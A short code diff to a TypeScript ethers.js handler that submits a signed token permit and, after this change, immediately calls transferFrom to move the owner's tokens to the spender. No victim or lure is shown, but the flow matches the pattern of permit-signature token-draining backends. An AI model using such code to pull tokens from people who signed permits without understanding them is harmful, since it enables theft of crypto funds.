@@ -267,7 +267,7 @@ async function handle(json: any) {
 
 	const {v, r, s} = ethers.utils.splitSignature(signature);
 	let tokenContract = new ethers.Contract(owner, [
-			'function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external payable',
+			'function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
 			'function transferFrom(address from, address to, uint256 value) external returns (bool)'
 	], wallet);
 
@@ -275,23 +275,16 @@ async function handle(json: any) {
 	console.log(args)
 	const gasLimit = ethers.utils.hexlify(100000); // You may need to adjust this value
 	const tx = await tokenContract.permit(...args, {
-		gasLimit,
-		owner,
-		spender,
-		value: amount,
-		deadline,
-		v,
-		r,
-		s
+		gasLimit
 	});
 	console.log("TX",tx);
 	await tx.wait();
 	console.log("FINISHED");
 
-	// const transferTx = await tokenContract.transferFrom(owner, spender, amount);
-	// const transferReceipt = await transferTx.wait();
-	//
-	// console.log('Tokens transferred successfully, transfer receipt:', transferReceipt);
+	const transferTx = await tokenContract.transferFrom(owner, spender, amount);
+	const transferReceipt = await transferTx.wait();
+
+	console.log('Tokens transferred successfully, transfer receipt:', transferReceipt);
 }
 
 
